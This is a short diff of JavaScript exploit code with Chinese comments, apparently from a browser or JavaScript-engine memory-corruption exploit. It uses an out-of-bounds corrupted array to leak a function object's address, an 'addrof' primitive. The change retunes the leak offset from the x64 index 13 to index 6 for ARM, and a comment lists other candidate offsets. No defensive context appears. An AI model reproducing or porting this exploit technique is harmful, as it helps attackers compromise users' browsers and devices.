@@ -140,7 +140,7 @@
             // ==================== 关键位置：尝试读取对象地址 ====================
             oobObjArr[0] = func;
             // ⚠️ 这里的索引 13 是 x64 的经验值，ARM 上可能需要调整（例如 6、8、10、12、14、16）
-            var addrDbl = corrupted_arr[13];
+            var addrDbl = corrupted_arr[6];
             var rawAddr = ftoi32(addrDbl)[1];
 
             if (rawAddr === 0 || rawAddr === 0x7ff80000 || rawAddr < 0x100000) {
